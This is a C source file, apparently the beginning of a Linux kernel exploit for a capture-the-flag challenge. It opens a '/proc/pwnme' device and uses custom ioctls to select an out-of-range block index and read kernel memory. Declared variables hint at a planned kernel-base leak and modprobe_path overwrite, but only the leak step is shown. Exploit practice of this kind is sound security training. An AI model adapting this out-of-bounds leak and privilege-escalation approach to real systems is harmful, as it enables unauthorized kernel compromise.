#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <mqueue.h>
#include <linux/io_uring.h>
#include <linux/keyctl.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <linux/netlink.h>
#include <arpa/inet.h>

int devfd;

struct fatptr {
	void *data;
	size_t size;
};

struct args_create { size_t size; };
struct args_switch { long index;  };

// add a struct fatptr entry to banks table
static int addblock(int size)
{
struct args_create ac;

		ac.size = size;
		return (ioctl(devfd, 0x40087000, &ac));
}

static int changeindex(int index)
{
struct args_switch as;

	as.index = index;
	return (ioctl(devfd, 0x40087001, &as));
}

int main(int argc, char *argv[])
{
int i;
int ret;
unsigned char buff[0x100];
unsigned char buff2[0X100];
unsigned char temp[16];
uint64_t leak1, kbase, modprobe_path;


	devfd = open("/proc/pwnme", O_RDWR);
	if (devfd < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}
	addblock(0x100);
	changeindex(1);
	read(devfd,buff,0x100);
	
	close(devfd);

}
